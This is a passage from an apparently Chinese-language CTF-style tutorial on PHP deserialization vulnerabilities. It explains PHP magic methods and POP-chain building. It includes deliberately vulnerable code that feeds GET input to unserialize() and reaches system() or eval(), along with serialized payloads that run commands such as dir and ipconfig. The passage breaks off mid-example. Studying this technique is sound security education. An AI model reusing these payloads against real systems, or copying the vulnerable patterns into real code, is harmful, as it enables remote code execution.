class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里直接构造参数benben&#x3D;dir即可</p><p><strong>__wakeup()</strong></p><p>和sleep相反，<strong>unserialize()</strong> 会检查是否存在一个wakeup()方法。如果存在，则会先调用，wakeup()方法，预先准备对象需要的资源。预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421183347881.png" alt="image-20240421183347881"></p><p><strong>例题</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421183634736.png" alt="image-20240421183634736"></p><p>可以看到本来没有赋值的password赋值了a</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>**O:4:”User”:1:{s:8:”username”;s:3:”dir”;}**，这里不用写全，因为最后也是调用wakeup只要用username即可，这句就相当于给username赋值</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421184030452.png" alt="image-20240421184030452"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><p>O:4:”xctf”:1:{s:4:”flag”:s:3:”111”;}</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><strong>__toString()</strong></h3><p>表达方式错误导致魔术方法触发，即把对象当成字符串 调用</p><p><strong>例子：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">&quot;this is test!!&quot;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="string">&#x27;格式不对，输出不了!&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421185655678.png" alt="image-20240421185655678"></p><p>可以看到，在echo时，调用了toString方法。把类User实体化并赋值给$test,此时$test是个对象调用对象可以使用print_r或者var_dump如果使用echo或者print只能调用字符串的方式去调用对象即把对象当成字符串使用，此时自动触发tostring()，常用于构造POP链</p><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h3><p>这个是格式方法错误导致被调用。</p><p>例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">&quot;this is test!!&quot;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">echo</span>  <span class="string">&#x27;它不是个函数!&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span> -&gt;benben;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>() -&gt;benben;<span class="comment">//这里是把他当函数调用了</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421190435573.png" alt="image-20240421190435573"></p><p>把类User实体化并赋值给$test为对象正常输出对象里的值benben加()是把test当成函数test()来调用,此时触发invoke()</p><h3 id="错误调用属性和方法的魔术方法"><a href="#错误调用属性和方法的魔术方法" class="headerlink" title="错误调用属性和方法的魔术方法"></a>错误调用属性和方法的魔术方法</h3><h4 id="call"><a href="#call" class="headerlink" title="__call()"></a><strong>__call()</strong></h4><p>触发时机:调用一个不存在的方法</p><p>功能:</p><p>参数:2个参数传参$arg1,$arg2</p><p>返回值:调用的不存在的方法的名称和参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt; <span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421192042597.png" alt="image-20240421192042597"></p><p>9调用的方法callxxx()不存在，触发魔术方法call(),传参$arg1,$arg2(callxxx,a)<br>$arg1,调用的不存在的方法的名称;</p><p>$arg2,调用的不存在的方法的参数;</p><h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421194930475.png" alt="image-20240421194930475"></p><p>触发时机:静态调用或调用成员常量时使用的方法不存在<br>参数:2个参数传参$arg1,$arg2</p><p>返回值:调用的不存在的方法的名称和参数<br> 静态调用::时的方法callxxx()不存在<br>触发callStatic()，传参$arg1,$arg2(callxxx,a)</p><h3 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h3><p>触发时机:调用的成员属性不存在</p><p>参数:传参$arg1</p><p>返回值:不存在的成员属性的名称</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421200603830.png" alt="image-20240421200603830"></p><h3 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h3><p>和get相对的</p><p>触发时机:给不存在的成员属性赋值</p><p>参数:传参$arg1,$arg2</p><p>返回值:不存在的成员属性的名称和赋的值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span> ,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421200840341.png" alt="image-20240421200840341"></p><p>既要调用也要赋值</p><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><p>触发时机:对不可访问属性使用 isset()或empty() 时，_isset()会被调用。</p><p>参数:传参$arg1</p><p>返回值:不存在的成员属性的名称</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421203616902.png" alt="image-20240421203616902"></p><p>isset()调用的成员属性var不可访问或不存在,z这里是访问了私有属性的成员</p><h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><p>触发时机:对不可访问属性使用 unset()时</p><p>参数:传参$arg1</p><p>返回值:不存在的成员属性的名称</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421204951446.png" alt="image-20240421204951446"></p><p>unset()调用的成员属性var不可访问或不存在<br>触发unset()返回$arg1,不存在成员属性的名称;</p><h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421205119991.png" alt="image-20240421205119991"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421205133831.png" alt="image-20240421205133831"></p><h2 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please attack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反推法：</p><p>利用点首先是在eval，这个是危险函数，然后eval的参数是test2，然后由action方法调用，往上找，normal类里也有个action，但不是魔术方法，不会自己调用，但可以发现index类里的destruct方法里会调用action，所以我们要给test赋值一个对象，也就是evil，所以构造时需要把test赋值成test，但前面construct也给test赋值了，但反序列化不会调用所以不管他，下面用代码构造payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#highlight_file(__FILE__);</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&quot;system(&#x27;dir&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">index</span>());</span><br><span class="line"><span class="comment">#echo urlencode(serialize(new index()))</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>O:5:”index”:1:{s:11:”%00index%00test”;O:4:”evil”:1:{s:5:”test2”;s:14:”system(‘dir’);”;}}</strong></p><p>另一种方法,要在$test2是在public的情况下才可以用</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;test2 = <span class="string">&quot;system(&#x27;ipconfig&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;test=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>魔术方法触发前提:魔术方法所在类(或对象)被调用</strong></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421214613496.png" alt="image-20240421214613496"></p><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a><strong>__wakeup()</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fast</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wakeup is here!!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;tostring is here!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line">?</span><br></pre></td></tr></table></figure><p>目的是显示tosring is here!!，这就需要我们去构造一个把对象当字符串输出的例子，所以我们需要把sec()示例化成对象后当成字符串输出，在echo中的source</p><p><strong>构造</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">##highlight_file(__FILE__);</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fast</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sec</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fast</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;source = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421215643611.png" alt="image-20240421215643611"></p><h2 id="POP链构造和POC编写"><a href="#POP链构造和POC编写" class="headerlink" title="POP链构造和POC编写"></a>POP链构造和POC编写</h2><p>在<strong>反序列化</strong>中，我们能控制的数据就是对象中的属性值(成员变量)所以在PHP反序列化中有一种漏洞利用方法叫”面向属性编程”即POP( Property Oriented Programming).</p><p><strong>POP链</strong>就是利用魔法方法在里面进行多次跳转然后获取敏感数据的-种payload。</p><p><strong>POC</strong>(全称:Proof of concept)中文译作概念验证。在安全界可以理解成漏洞验证程序。PoC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span 